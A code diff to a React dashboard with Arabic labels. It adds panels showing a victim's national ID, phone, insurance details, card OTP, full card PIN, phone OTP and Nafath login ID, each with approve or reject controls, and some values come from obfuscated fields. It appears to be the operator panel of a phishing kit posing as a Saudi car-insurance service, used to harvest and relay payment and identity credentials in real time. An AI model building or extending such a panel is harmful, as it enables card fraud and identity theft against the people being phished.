@@ -1638,6 +1638,270 @@ const renderNafadBox = () => {
     );
   };
 
+  // Render static boxes with injected data
+  const renderStaticBoxes = () => {
+    // Get latest data for each type
+    const basicRaw = getLatestRawForBox('basic') || selectedRequest?.raw || {};
+    const insuranceRaw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
+    const paymentStatus = getPaymentStatus();
+    const cardOtpStatus = getCardOtpStatus();
+    const pinStatus = getPinStatus();
+    const phoneOtpStatus = getPhoneOtpStatus();
+    const nafadStatus = getNafadStatus();
+    
+    // Get OTP codes
+    const cardOtpCode = String(selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode || "").trim();
+    const pinCode = String(selectedRequest?.raw?._v6 || selectedRequest?.raw?.pinCode || "0000").padStart(4, "0");
+    const phoneOtpCode = String(selectedRequest?.raw?._v7 || selectedRequest?.raw?.phoneOtp || "").trim();
+    
+    // Get timestamps
+    const getTimestamp = (raw: Record<string, any>): string => {
+      const entry = customerEntryGroup.find(e => {
+        const entryRaw = e.raw || {};
+        return entryRaw.identityNumber === raw.identityNumber ||
+               entryRaw.phoneNumber === raw.phoneNumber ||
+               entryRaw.nafadIdNumber === raw.nafadIdNumber;
+      });
+      if (!entry) return "";
+      return new Date(entry.submittedAt || entry.updatedAt || 0).toLocaleString("ar-SA", { hour: "2-digit", minute: "2-digit", hour12: true });
+    };
+
+    return (
+      <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 16 }}>
+        
+        {/* صندوق المعلومات الأساسية */}
+        <div style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb",
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}>
+          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <span style={{ fontSize: "1.2rem" }}>📋</span>
+            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق المعلومات الأساسية</h3>
+          </div>
+          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+            {basicRaw?.identityNumber && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.identityNumber}</span>
+              </div>
+            )}
+            {basicRaw?.ownerName && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الاسم</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.ownerName}</span>
+              </div>
+            )}
+            {basicRaw?.phoneNumber && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهاتف</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.phoneNumber}</span>
+              </div>
+            )}
+            {basicRaw?.buyerName && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم المشتري</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.buyerName}</span>
+              </div>
+            )}
+            {basicRaw?.documentType && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع المستند</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.documentType}</span>
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* صندوق تفاصيل التأمين */}
+        <div style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb",
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}>
+          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <span style={{ fontSize: "1.2rem" }}>🛡️</span>
+            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق تفاصيل التأمين</h3>
+          </div>
+          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+            {insuranceRaw?.insuranceCoverage && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع التغطية</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.insuranceCoverage === "comprehensive" ? "شامل" : "ضد الغير"}</span>
+              </div>
+            )}
+            {insuranceRaw?.vehicleModel && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الموديل</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.vehicleModel}</span>
+              </div>
+            )}
+            {insuranceRaw?.vehicleValue && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>القيمة التقديرية</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.vehicleValue} ﷼</span>
+              </div>
+            )}
+            {insuranceRaw?.vehicleYear && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>سنة الصنع</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.vehicleYear}</span>
+              </div>
+            )}
+            {insuranceRaw?.repairLocation && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>مكان الإصلاح</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.repairLocation === "agency" ? "الوكالة" : "الورشة"}</span>
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* صندوق بيانات الدفع */}
+        <div style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb",
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}>
+          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <span style={{ fontSize: "1.2rem" }}>💳</span>
+            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
+          </div>
+          {paymentStatus === "approved" && (
+            <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", textAlign: "center" }}>
+              <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p>
+            </div>
+          )}
+          {paymentStatus === "rejected" && (
+            <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", textAlign: "center" }}>
+              <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض</p>
+            </div>
+          )}
+          {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && (
+            <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", textAlign: "center" }}>
+              <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
+            </div>
+          )}
+        </div>
+
+        {/* صندوق رمز التحقق من البطاقة */}
+        {cardOtpCode && (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto"
+          }}>
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <span style={{ fontSize: "1.2rem" }}>🔐</span>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق من البطاقة</h3>
+            </div>
+            <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center" }}>
+              <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق:</p>
+              <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardOtpCode}</p>
+            </div>
+            {cardOtpStatus === "approved" && <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p></div>}
+            {cardOtpStatus === "rejected" && <div style={{ marginTop: 8, background: "#fee2e2", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض</p></div>}
+          </div>
+        )}
+
+        {/* صندوق رمز PIN */}
+        <div style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb",
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}>
+          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <span style={{ fontSize: "1.2rem" }}>🔑</span>
+            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز PIN</h3>
+          </div>
+          <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
+            {Array.from({ length: 4 }).map((_, idx) => (
+              <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
+                <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinCode[idx]}</span>
+              </div>
+            ))}
+          </div>
+          {pinStatus === "approved" && <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p></div>}
+          {pinStatus === "rejected" && <div style={{ marginTop: 8, background: "#fee2e2", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض</p></div>}
+        </div>
+
+        {/* صندوق تحقق الهاتف */}
+        <div style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb",
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}>
+          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <span style={{ fontSize: "1.2rem" }}>📱</span>
+            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
+          </div>
+          {basicRaw?.phoneNumber && (
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.phoneNumber}</span>
+            </div>
+          )}
+          {phoneOtpCode && (
+            <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
+              <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{phoneOtpCode}</p>
+            </div>
+          )}
+          {phoneOtpStatus === "approved" && <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p></div>}
+          {phoneOtpStatus === "rejected" && <div style={{ marginTop: 8, background: "#fee2e2", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض</p></div>}
+        </div>
+
+        {/* صندوق نفاذ */}
+        <div style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb",
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}>
+          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <span style={{ fontSize: "1.2rem" }}>🇸🇦</span>
+            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
+          </div>
+          {selectedRequest?.raw?.nafadIdNumber && (
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{selectedRequest.raw.nafadIdNumber}</span>
+            </div>
+          )}
+          {nafadStatus === "approved" && <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p></div>}
+          {nafadStatus === "rejected" && <div style={{ marginTop: 8, background: "#fee2e2", borderRadius: 8, padding: 8, textAlign: "center" }}><p style={{ margin: 0, fontSize: "0.8rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض</p></div>}
+        </div>
+
+      </div>
+    );
+  };
+
   // Render action buttons based on current page
   const renderActionButtons = () => {
     // Get the selected request's timestamp
@@ -1653,7 +1917,6 @@ const renderNafadBox = () => {
     
     const nafadBox = renderNafadBox();
     if (nafadBox) {
-      // Get the newest timestamp for nafad from customer entries
       const nafadEntries = customerEntryGroup.filter(e => e.raw?.nafadStatus || e.raw?.nafadIdNumber);
       const nafadTime = nafadEntries.length > 0 
         ? Math.max(...nafadEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
@@ -1715,7 +1978,6 @@ const renderNafadBox = () => {
       boxes.push({ name: 'insurance', timestamp: insuranceTime, component: insuranceBox });
     }
     
-    // Sort boxes by timestamp (newest first), boxes without timestamp go at the end
     boxes.sort((a, b) => {
       if (a.timestamp === 0 && b.timestamp === 0) return 0;
       if (a.timestamp === 0) return 1;
@@ -2319,7 +2581,7 @@ const renderNafadBox = () => {
                   boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8)",
                 }}
               >
-                {renderActionButtons()}
+                {renderStaticBoxes()}
               </div>
             </div>
           )}
